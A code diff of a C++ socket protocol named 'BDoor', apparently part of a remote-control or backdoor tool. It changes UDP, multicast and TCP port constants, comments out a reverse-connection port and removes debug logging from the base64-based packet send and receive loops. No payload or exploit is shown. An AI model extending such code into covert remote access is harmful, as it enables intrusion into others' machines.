@@ -5,6 +5,7 @@
 #include <other/tools.h>
 #include <protocol\errorstr.h>
 #include <fstream>
+#include <module/module.h>
 #pragma comment(lib,"ws2_32.lib") 
 using json = nlohmann::json;
 #define EMPTYCHAR "0"
@@ -13,11 +14,11 @@ using json = nlohmann::json;
 #define PROTOCOLNAME "BDoor"
 #define COMMANDNAME "CommandName"
 #define CONTENT "Content"
-#define UDP_PORT 2410
-#define GROUP_PORT 2411
+#define UDP_PORT 1030
+#define GROUP_PORT 1031
 #define GROUP_IP "224.1.1.4" 
-#define TCP_PORT 2412
-#define REVERSE_PORT 2413
+#define TCP_PORT 1032
+//#define REVERSE_PORT 1033
 #define NOTCOM 0
 #define END 1
 #define ENTRANCE 2
@@ -29,7 +30,7 @@ using json = nlohmann::json;
 #define TIMEOUT 3000
 #define TCP_PACKAGELEN 60000
 #define UDP_PACKAGELEN 1024
-#define PACKAGE_EXTRA 500
+#define PACKAGE_EXTRA 128
 //#define REVERSECONNECT "reverse connect"
 
 int WSAInit() {
@@ -126,7 +127,6 @@ namespace tcp {
 		sendmess = EncodeBase64(sendmess, false) + FIN_CHAR;
 		int Result;
 		string submess;
-		int num = 1;
 		for (int i = 0; i < sendmess.size(); i++) {
 			if (sendmess.size() - i >= TCP_PACKAGELEN) {
 				submess = sendmess.substr(i, TCP_PACKAGELEN);
@@ -135,12 +135,8 @@ namespace tcp {
 			else {
 				submess = sendmess.substr(i, sendmess.size() - i);
 				i += sendmess.size() - 1;
-				DebugLog("last package: " + to_string(submess.size()));
 			}
-
 			Result = send(s, submess.c_str(), submess.size() + 1, 0);
-			DebugLog("package num: " + to_string(num));
-			num++;
 			if (Result <= 0) { break; }
 		}
 		if (Result == SOCKET_ERROR) {
@@ -160,7 +156,6 @@ namespace tcp {
 		while (true) {
 			memset(buf, 0, sizeof(buf));
 			Result = recv(s, buf, sizeof(buf), 0);
-			DebugLog("buf strlen: " + to_string(strlen(buf)));
 			if (Result <= 0) { break; }
 			else {
 				recvmess += buf;
